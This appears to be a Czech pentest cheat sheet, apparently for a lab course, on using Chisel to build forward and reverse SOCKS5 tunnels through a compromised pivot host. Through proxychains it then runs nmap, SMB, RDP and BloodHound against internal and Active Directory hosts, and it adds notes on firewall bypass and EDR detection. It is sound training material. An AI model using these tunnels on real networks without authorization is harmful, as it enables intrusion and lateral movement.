# SOCKS5 Tunneling – Chisel

## Přehled

**Chisel** je nástroj pro tvorbu TCP/UDP tunelů a SOCKS5 proxy během pivotingu.

Využití:

- přístup do interních sítí přes kompromitovaný host
- obcházení síťové segmentace
- náhrada za SSH tunneling
- vytvoření stabilního C2 kanálu

Technologie:

- napsaný v Go
- komunikace přes HTTP/WebSocket
- šifrování pomocí SSH protokolu
- vhodný při omezeních firewallu

Typický scénář:

```
Kali
 |
 | Chisel tunnel
 |
Pivot Host (Ubuntu/Windows)
 |
 |
Internal Network
172.16.5.0/24
```

---

# 1. Chisel Forward SOCKS Tunnel

## Použití

Použij, pokud:

- pivot host je dostupný z Kali
- můžeš se připojit přímo na jeho port
- firewall povoluje příchozí spojení

---

## Pivot Host – Chisel server

Spuštění na kompromitovaném stroji:

```
./chisel server -p 1234 --socks5 -v
```

Výsledek:

```
Listening on :1234
SOCKS5 proxy enabled
```

Pivot čeká na spojení.

---

## Kali – Chisel client

Připojení na pivot:

```
./chisel client 10.129.202.64:1234 socks
```

Výsledek:

```
SOCKS5 proxy created
127.0.0.1:1080
```

Nyní máš:

```
Kali localhost:1080
        |
        |
      Chisel
        |
        |
 Pivot Host
        |
 Internal Network
```

---

# 2. Chisel Reverse SOCKS Tunnel

## Nejčastější varianta v praxi

Použij pokud:

- pivot nemá otevřené příchozí porty
- pivot může komunikovat ven
- firewall blokuje inbound spojení

Schéma:

```
Internal Host

      |
      |
 Pivot Host
      |
      | outbound connection
      |
      v

Kali
SOCKS5 Proxy
```

---

# Kali – Chisel Server

Spustíš:

```
sudo ./chisel server \
--reverse \
-p 1234 \
--socks5 \
-v
```

Čeká na spojení.

---

# Pivot Host – Chisel Client

Spustíš:

```
./chisel client \
-v \
10.10.14.17:1234 \
R:socks
```

---

Výsledek:

Na Kali vznikne:

```
127.0.0.1:1080
```

který vede:

```
Kali
 |
Chisel SOCKS
 |
Pivot
 |
Internal Network
```

---

# 3. Proxychains konfigurace

Chisel vytvoří SOCKS5 proxy.

Uprav:

```
sudo nano /etc/proxychains4.conf
```

Přidej:

```
[ProxyList]

socks5 127.0.0.1 1080
```

---

# Použití přes Proxychains

## Nmap

Používej vždy:

```
proxychains nmap \
-sT \
-Pn \
-n \
172.16.5.19
```

Důvody:

|Parametr|Důvod|
|---|---|
|-sT|TCP Connect scan (funguje přes SOCKS)|
|-Pn|ICMP neprojde přes proxy|
|-n|žádné DNS lookupy|

---

## SMB

```
proxychains smbclient \
-L //172.16.5.19/
```

---

## RDP

```
proxychains xfreerdp \
/v:172.16.5.19 \
/u:user \
/p:password
```

---

# Chisel vs SSH vs Metasploit

|Vlastnost|Chisel|SSH Tunnel|Meterpreter|
|---|---|---|---|
|SSH účet|❌|✅|❌|
|SOCKS proxy|✅|✅|✅|
|Reverse tunel|✅|✅|✅|
|Rychlost|vysoká|vysoká|střední|
|Firewall bypass|dobrý|horší|dobrý|
|Detection risk|střední|nízký|vyšší|

---

# Praktické použití v pentestu

## 1. Přístup do interní VLAN

Situace:

```
Internet

Kali
 |
 |
Web Server (pivot)
 |
 |
192.168.10.0/24
```

Řešení:

```
Chisel reverse SOCKS
```

Potom:

```
proxychains nmap 192.168.10.0/24
```

---

# 2. Přístup k Active Directory

Po získání pivotu:

```
Pivot
 |
 |
Domain Controller
```

Použití:

- SMB enumeration
- LDAP enumeration
- BloodHound
- Kerberos útoky

Například:

```
proxychains bloodhound-python \
-u user \
-p password \
-d domain.local \
-c All \
-ns 172.16.5.10
```

---

# 3. Přístup k interním webům

Například:

```
172.16.5.50:80
```

Přes proxy:

```
proxychains firefox
```

nebo:

```
proxychains curl http://172.16.5.50
```

---

# Troubleshooting

## Chisel spojení funguje, ale nic nevidím

Kontrola:

```
netstat -tunlp
```

Měl by být:

```
127.0.0.1:1080 LISTEN
```

---

## Nmap ukazuje všechno filtered

Špatně:

```
proxychains nmap -sS
```

Správně:

```
proxychains nmap -sT -Pn -n
```

---

## SOCKS nefunguje

Kontrola proxychains:

```
proxychains curl ifconfig.me
```

---

# OPSEC poznámky

Výhody:

✅ jeden binární soubor  
✅ není potřeba SSH účet  
✅ funguje přes HTTP/WebSocket  
✅ vhodný pro interní pivoting

Nevýhody:

❌ binárka může být detekována EDR  
❌ Go binárky bývají větší  
❌ špatně nakonfigurovaný tunel může být nestabilní

---

# Pentester rozhodovací strom

```
Mám SSH?
 |
 +-- Ano
 |     |
 |     +-- Chci pohodlí
 |           |
 |           sshuttle
 |
 +-- Ne
       |
       Mám Meterpreter?
       |
       +-- Ano
       |     |
       |     autoroute + socks_proxy
       |
       +-- Ne
             |
             Můžu spustit binárku?
                    |
                    +-- Ano
                    |     |
                    |     Chisel
                    |
                    +-- Ne
                          |
                          Live-off-the-land
                          netsh / plink
```